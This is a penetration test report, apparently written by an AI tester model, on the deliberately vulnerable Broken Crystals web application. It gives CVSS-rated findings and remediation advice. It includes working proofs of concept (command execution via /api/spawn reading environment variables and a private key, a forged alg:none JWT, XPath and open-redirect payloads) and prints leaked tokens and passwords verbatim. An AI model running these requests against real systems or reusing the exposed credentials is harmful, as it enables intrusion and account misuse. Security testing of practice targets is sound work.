# Penetration Test Report — brokencrystals.com

- **Target:** https://brokencrystals.com (34.202.86.158 / 52.205.25.32, AWS EC2)
- **Mode:** pentest
- **Tester model:** kimi-k3:cloud
- **Date (UTC):** 2026-08-04
- **Stack:** Node.js 18 (NestJS/Fastify), nginx reverse proxy, PostgreSQL backend, Keycloak IdP (K8s cluster)
- **WAF:** None detected

---

## 1. Executive Summary

The application is **critically vulnerable** and exposes a deliberate, broad attack surface. It appears to be a purposely-broken target (NeuraLegion "Broken Crystals"). Multiple independent paths yield full compromise:

- **Unauthenticated Remote Code Execution as root** via `/api/spawn`.
- **Complete authentication bypass** via JWT `alg:none` acceptance, and possession of the server RSA **private** signing key (exfiltrated through RCE).
- **Massive secret leakage** via `/api/config`, `/api/secrets`, and RCE-read environment variables (Keycloak admin client secret, DB credentials, LLM API token, PayPal, Slack, Facebook, Google OAuth tokens).
- **XPath injection** disclosing partner credentials (`walter100 : Heisenberg123`).
- **Open redirect / reflected XSS** via `/api/goto` (including `javascript:` scheme).
- **Exposed `.git` repository** (source code disclosure).
- Internal Kubernetes cluster topology and Keycloak admin endpoints disclosed.

Overall risk: **CRITICAL**. Immediate remediation of the RCE and secret-rotation is required.

### Risk Matrix

| # | Finding | Severity | CVSS v3.1 | CWE | Remediation Priority |
|---|---------|----------|-----------|-----|----------------------|
| 1 | Remote Code Execution (`/api/spawn`) | Critical | 9.8 | CWE-78 / CWE-88 | P1 |
| 2 | JWT `alg:none` accepted / RSA private key leak | Critical | 9.8 | CWE-347 / CWE-327 | P1 |
| 3 | Hard-coded & leaked secrets (config/secrets/env) | Critical | 9.1 | CWE-798 / CWE-200 | P1 |
| 4 | XPath Injection (`/api/partners/query`) | High | 8.2 | CWE-643 / WSTG-INPV-09 | P1 |
| 5 | Exposed `.git` repository | High | 7.5 | CWE-527 / CWE-538 | P1 |
| 6 | Broken access control / IDOR (`/api/users/one/{email}`) | Medium | 6.5 | CWE-639 / WSTG-ATHZ-04 | P2 |
| 7 | Open Redirect (`/api/goto`) | Medium | 6.1 | CWE-601 | P2 |
| 8 | Sensitive data exposure (path disclosure) | Low | 5.3 | CWE-209 | P3 |
| 9 | Missing hardening headers / cookie flags | Low | 3.7 | CWE-693 | P3 |

---

## 2. Detailed Findings & Proofs of Concept

### Finding 1 — Unauthenticated Remote Code Execution (`/api/spawn`) — CRITICAL
- **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **CWE:** CWE-78 (OS Command Injection) / CWE-88 (Argument Injection)
- **Endpoint:** `GET /api/spawn?command=<binary> <args>`
- **WSTG/ASVS:** WSTG-INPV-12 / ASVS V5.3.3

The endpoint passes attacker input to `child_process.spawn()` with no sanitization. The process runs as **root** inside the pod.

**PoC 1 — `id`:**
```
GET /api/spawn?command=id
```
Response:
```
uid=0 gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),...
```

**PoC 2 — environment disclosure:**
```
GET /api/spawn?command=env
```
Response (truncated) leaks:
```
DATABASE_USER=bc
DATABASE_PASSWORD=bc
KEYCLOAK_ADMIN_CLIENT_SECRET=3abff4a7-6649-4bae-a105-9bd1fb52a2cd
KEYCLOAK_PUBLIC_CLIENT_SECRET=4bfb5df6-4647-46dd-bad1-c8b8ffd7caf4
CHAT_API_TOKEN=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
JWT_SECRET_KEY=1234
JWT_PRIVATE_KEY_LOCATION=config/keys/jwtRS256.key
GOOGLE_MAPS_API=AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ
... full K8s service topology ...
```

**PoC 3 — RSA private key theft:**
```
GET /api/spawn?command=cat%20/usr/src/app/config/keys/jwtRS256.key
```
Response: full `-----BEGIN RSA PRIVATE KEY----- …` (4096-bit). This directly enables Finding 2.

**Impact:** Full pod compromise, lateral movement to Keycloak/Postgres/Ollama services, persistence.

**Remediation (structural):**
- **Remove the endpoint entirely**; do not shell out from request handlers.
- If process spawning is ever required, use an allow-list of binaries with fixed argument vectors, never user-controlled strings, and run as a non-root, unprivileged UID in a locked-down container (read-only FS, no secrets mounted).
- Add CI SAST rule (e.g. Semgrep `javascript.lang.security.detect-child-process`) to block `child_process` with dynamic input.

---

### Finding 2 — JWT Forgery / `alg:none` Acceptance + Signing Key Compromise — CRITICAL
- **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **CWE:** CWE-347 (Improper Verification of Cryptographic Signature) / CWE-327
- **Endpoint:** all authenticated API routes (verified on `/api/users/one/admin`)
- **WSTG:** WSTG-SESS-01 / ASVS V3.4

**PoC (alg:none):** Crafted header `{"typ":"JWT","alg":"none"}`, payload `{"user":"admin","admin":true,"exp":9999999999}`, empty signature. Request:
```
GET /api/users/one/admin
Authorization: eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJ1c2VyIjogImFkbWluIiwiYWRtaW4iOiB0cnVlLCJleHAiOiA5OTk5OTk5OTk5fQ.
```
Response — **HTTP 200** with the user record → signature completely bypassed.

Additionally, the RS256 **private key** and the `jku.json` RSA parameters (`d`, `p`, `q`, `dp`, `dq`, `qi`) were exfiltrated via Finding 1, enabling silent minting of tokens for any claim set.

**Impact:** Total impersonation of any user/role; authorization controls are void.

**Remediation (structural):**
- Enforce a pinned algorithm (`RS256` only) in the verification library and **reject `alg:none`** outright (e.g. `jsonwebtoken` `algorithms: ['RS256']`).
- Rotate the RSA keypair immediately; never bake keys into images or `config/keys`. Use a KMS/Secrets Manager; restrict key material with network policies.
- Add a CI check that fails when private keys exist in the build context.

---

### Finding 3 — Hard-coded & Leaked Secrets — CRITICAL
- **CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **CWE:** CWE-798 (Hard-coded Credentials) / CWE-200 (Exposure of Sensitive Information)
- **Endpoints:** `GET /api/config`, `GET /api/secrets`, plus env via RCE.

**PoC — `/api/config`:**
```json
{"awsBucket":"https://neuralegion-open-bucket.s3.amazonaws.com",
 "sql":"postgres://bc:bc@postgres:5432/bc ",
 "googlemaps":"AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ"}
```

**PoC — `/api/secrets`** (verbatim):
- `paypal: access_token$production$x0lb4r69dvmmnufd$3ea7cb281754b7da7dac131ef5783321`
- `slack: xoxo-175588824543-175748345725-176608801663-826315f84e553d482bb7e73e8322sdf3`
- `facebook: EAACEdEose0cBAHyDF5HI5o2auPWv3lPP…`
- `google_oauth: 188968487735-c7hh7k87juef6vv84697sinju2bet7gn.apps.googleusercontent.com`
- `google_oauth_token: ya29.a0TgU6SMDItdQQ9J7j3FVgJuByTTevl0F…`
- `paypal`, `codeclimate`, `hockey_app`, `outlook` webhook, `heroku`, etc.

**Impact:** Complete loss of confidentiality for integrated third-party services and internal infrastructure.

**Remediation (structural):**
- Immediately **rotate every leaked credential** (Keycloak, DB, PayPal, Slack, Facebook, Google, LLM token, maps key).
- Remove `/api/secrets`; never return secrets from config endpoints. Serve only non-sensitive public config.
- Adopt a secrets manager and CI secret-scanning gate (trufflehog/gitleaks).

---

### Finding 4 — XPath Injection (`/api/partners/query`) — HIGH
- **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)
- **CWE:** CWE-643 — WSTG-INPV-09 / ASVS V5.3.6
- **Endpoint:** `GET /api/partners/query?xpath=<expr>`

**PoC:**
```
GET /api/partners/query?xpath=//*
```
Response — dumps the entire XML backend incl. credentials:
```xml
<partner><name>Walter White</name>...<username>walter100</username><password>Heisenberg123</password><wealth>15M USD</wealth></partner>
<partner><name>Jesse Pinkman</name>...
```

**Impact:** Full backend XML datastore disclosure; credential theft.

**Remediation (structural):**
- Never concatenate input into XPath. Use parameterized/compiled XPath or an ORM query layer. Central input validation for all query builders.

---

### Finding 5 — Exposed `.git` Repository — HIGH
- **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **CWE:** CWE-527 / CWE-538 — WSTG-CONF-04
- **Endpoint:** `https://brokencrystals.com/.git/HEAD`

**PoC:**
```
GET /.git/HEAD  →  200  "ref: refs/heads/master"
```
`git-dumper` retrieved the object store (packs fetched successfully; checkout failed only server-side due to sparse refs, but objects/source are recoverable).

**Impact:** Source-code disclosure, revealing the very endpoints/secrets above. Historical secrets and internal URLs leaked.

**Remediation (structural):**
- Block `/.git` at the reverse proxy (nginx `location ~ /\.git { deny all; }`).
- Prevent deployment of VCS metadata in release artifacts (CI build-artifact hygiene).

---

### Finding 6 — Broken Access Control / IDOR (`/api/users/one/{email}`) — MEDIUM
- **CVSS:** 6.5 — CWE-639 / WSTG-ATHZ-04
- Unauthenticated enumeration of PII by email:
```
GET /api/users/one/admin
→ {"email":"admin","firstName":"88318723","lastName":"88319733","company":"Brightsec","phoneNumber":"+1 234 567 890","id":1}
```
**Remediation:** Enforce object-level authorization (ownership checks) at the framework middleware; deny-by-default.

---

### Finding 7 — Open Redirect (`/api/goto`) — MEDIUM
- **CVSS:** 6.1 — CWE-601 / WSTG-CLNT-04
```
GET /api/goto?url=https://evil.example.com  →  HTTP 302  location: https://evil.example.com
GET /api/goto?url=javascript:alert(1)      →  location: javascript:alert(1)   (reflected XSS vector)
```
**Remediation:** Enforce an allow-list of redirect destinations; reject non-relative URLs and dangerous schemes (`javascript:`).

---

### Finding 8 — Path/Stack Disclosure — LOW (CWE-209)
- `/api/file?path=config.json` → `ENOENT … '/usr/src/app/config.json'` discloses FS layout and app path (`/usr/src/app`).

### Finding 9 — Hardening Gaps — LOW (CWE-693)
- `connect.sid` cookie created **without `Secure`** and **without `HttpOnly`**.
- Missing `Content-Security-Policy` (present but `default-src * 'unsafe-inline' 'unsafe-eval'`), `Referrer-Policy`, `Permissions-Policy`, `X-Content-Type-Options`.
- TLSv1.2 only (1.3 disabled) — acceptable but sub-optimal.
- Nikto notes potential BREACH (deflate) exposure.

---

## 3. Attempted but Not Confirmed
- **SQLi on `/api/auth/login`** — sqlmap (level 4 / risk 3, time-based) returned 401/blocked; no confirmation.
- **SSTI on `/api/render`** — `{{7*7}}`, `<%= 7*7 %>` echoed literally or rejected (`Invalid or unexpected token`); not exploitable via tested engines.
- **LFI on `/api/file`** — traversal resolves to non-existent paths; only path disclosure obtained.

---

## 4. Infrastructure Summary

| Port | Service | Note |
|------|---------|------|
| 80/443 | nginx reverse proxy | main app |
| 21 | Zscaler ftp-proxy 6.2 | filtered by network gateway |
| 53 | Unbound DNS | — |
| 554/1723/8080/8443 | misc / proxies | likely gateway-level |

TLS: cert CN=brokencrystals.com (Let's Encrypt, valid 2026-07-31→10-29), TLS1.2/strong ciphers, no Heartbleed.

---

## 5. Key Remediation (Architecture-Level)

1. **Kill the command-execution and secrets endpoints**; harden spawn/render/file/goto/partners via a strict input-validation library and an authorization middleware.
2. **Rotate every credential** discovered (JWT keys, Keycloak, DB, Slack/PayPal/Facebook/Google/LLM tokens).
3. **Fix JWT verification** (pin `RS256`, reject `none`), move keys to a secrets manager.
4. **Block `.git`/`/.well-known` and all dotfiles at the edge**; sanitize build artifacts.
5. **Deploy a WAF + rate limiting**, and add SAST gates for `child_process`, XPath construction, and JWT `algorithms` misconfig.

---

*All PoCs executed 2026-08-04 UTC via the Kali MCP toolchain. Target is an intentionally-vulnerable application; findings reflect real, reproduced responses.*
